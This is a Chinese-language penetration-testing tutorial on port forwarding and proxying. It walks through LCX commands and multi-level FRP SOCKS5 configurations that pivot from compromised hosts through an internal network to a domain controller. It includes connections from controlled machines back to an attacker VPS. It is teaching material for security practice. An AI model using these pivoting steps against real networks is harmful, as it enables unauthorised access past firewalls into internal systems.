---
title: 端口转发与代理
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-25T02:19:52+08:00
categories: 
- 渗透测试
- 内网体系建设
---

## 端口转发和代理

### 正向shell与反向shell

**正向连接**

受控主机监听一个端口，由控制端主机主动连接获取shell称为正向连接，适用于受控主机具有一个公网ip的情况

**反向连接**

控制端监听一个端口，受控主机反向连接控制端获取shell成为反向连接，受控主机没有公网ip时使用，例如处于内网的主机

### 端口转发

端口转发，将一个网络端口的上收到的数据转发到另一个端口，转发的端口可以是自己的主机，也可以是别的主机。在内网环境中，防火墙对敏感端口进行检测，我们可以将敏感端口数据转发到防火墙允许的端口上，绕过防火墙的检测

端口映射，将公网的地址翻译为私有地址，将外网主机收到的请求映射到内网主机上，使没有公网IP的内网主机能够对外提供服务

### SOCKS代理

一种代理协议，默认端口为1080.版本有SOCKS4和SOCKS5两个，socks4只支持TCP，SOCKS5在4的基础上进行扩展，可以支持UDP等各种身份验证协议，通过搭建SOCKS代理服务器，可以与目标内网进行通信，避免了多次端口转发

## 常见代理与转发工具

### LCX

**目标机器有公网ip**

当拿下一台公网主机的控制权后，若目标对3389远程桌面存在限制，可以通过上传lxc协议的形式，将3389转发到4444端口，例如

```
lcx.exe -tran 4444 127.0.0.1 3389
```

```
此时即可连接4444端口访问远程桌面
redesktop xxxxxxxx 4444
```

**端口映射**

当拿下一台公网主机的控制权，发现该机器为双网卡机器，抓取到内网还存在一台机器的ssh登录凭据，通过端口映射将该内网机的服务转发到具有公网ip的机器上，使我们可以直接连接

```
lcx.exe -tran 2222 10.10.10.20 22
```

转发后由于受控主机2222端口暴露在公网上，我们可以使用ssh凭据直接登录2222端口，也就是内网主机的22端口

**目标机器无公网ip**

当目标机器没有公网IP，我们需要一台有公网IP的VPS(做测试可以采用同一网段进行模拟)，通过在VPS上监听本地的4444端口，同时将8888端口的数据转发到4444端口

```
lcx.exe -listen 4444 8888
```

在受控主机上使用lcx用本地3389端口连接VPS的8888端口

```
./lcx.exe -slave vps_ip 8888 127.0.0.1 3389
```

通过连接VPS的4444端口，即可访问受控主机的桌面

### FRP

FRP支持搭建SOCKS5服务进行穿透，现通过假设的内网环境进行1，2，3级代理，假设有如下环境

|         | IP1             | IP2             |
| ------- | --------------- | --------------- |
| 公网vps | vps_ip          |                 |
| pc1     | 192.168.93.10   |                 |
| pc2     | 192.168.93.20   | 192.168.111.130 |
| pc3     | 192.168.111.140 |                 |
| pc4     | 192.168.111.150 | 10.10.10.20     |
| pc5     | 10.10.10.30     |                 |
| dc      | 10.10.10.10     |                 |

假设我们获得3台机器的控制权，最终目的使访问到dc

#### 一级代理

将公网上的vps作为frp的服务端，其余三台都作为客户端

服务端配置.frps.ini

```
[common]
bind_addr = 0.0.0.0   #服务端的IP地址
bind_port = 7000 	  #服务端上绑定的端口
```

启动服务端

```
./frps -c ./frps.ini
```

配置客户端文件pc1上配置.frpc.ini

```
[common]
server_addr = vps_ip
server_port = 7000 #与服务端端口一致
[socks5]
remote_port = 1080  #转发出去的端口
plugin = socks5 #代理的类型
```

客户端启动

```
./frpc -c ./frpc.ini
```

启动成功后，该1080端口会被转发到服务端，我们可以添加socks5全局代理访问内网

例如使用工具proxychains和proxifier

```
/etc/proxychains.conf添加
socks5 vps_ip 1080 #这里添加被转发出来的端口
```

#### 二级代理

搭建二级代理时，需要重新修改pc1的客户端配置

```shell
[common]
server_addr = vps_ip
server_port = 7000 #与服务端端口一致
[socks5_forward]
type = tcp #使用的协议
remote_port = 1080  #转发出去的端口
local_ip = 192.168.93.10 #本地监听的IP地址
local_port = 10080 #要转发的本地端口
```

再将pc1作为服务端启动，配置frps.ini

```shell
[common]
bind_addr = 0.0.0.0   #pc1的IP地址
bind_port = 7000 	  #pc1上绑定的端口
```

再将pc2作为客户端，配置frpc.ini

```shell
[common]
server_addr = 192.168.93.10 #pc1的ip地址
server_port = 7000 #与服务端端口一致
[socks5]
type = tcp 
remote_port = 10080  #转发出去的端口
plugin = socks5 #代理的类型
```

搭建完后就能通过代理访问到pc3

#### 三级代理

重新修改pc2作为客户端的配置，将10081端口转发出去

```shell
[common]
server_addr = 192.168.93.10 #pc1的ip地址
server_port = 7000 #与服务端端口一致
[socks5_forward]
type = tcp 
remote_port = 10080  #转发出去的端口
local_ip = 192.168.111.130 #本地监听的IP地址，及本机下一网段(内网的ip)
local_port = 10081  #本地监听的端口 
```

将pc2作为服务端启动，配置frps.ini文件

```shell
[common]
bind_addr = 192.168.111.130  #pc2的IP地址
bind_port = 7000 	  #pc2上绑定的端口
```

将与域控机器连接的pc4作为客户端配置frpc.ini

```shell
[common]
server_addr = 192.168.111.130 #pc2的ip地址
server_port = 7000 #与服务端端口一致
[socks5]
type = tcp 
remote_port = 10081  #转发出去的端口
plugin = socks5 #代理的类型
```

如此我们便能访问域控主机DC

## 总结:

端口转发与端口映射的区别在于，端口转发用于将数据转发到另一端口上，端口映射则能够将内网的服务映射到公网，二者的本质区别在于侧重点，转发侧重于转，是单一的过程，而映射则是直接供所有人使用一个映射端口

多级的代理本质上是将已经作为客户端的机器，再一次作为服务端进行使用，并且新增一个端口用于转发

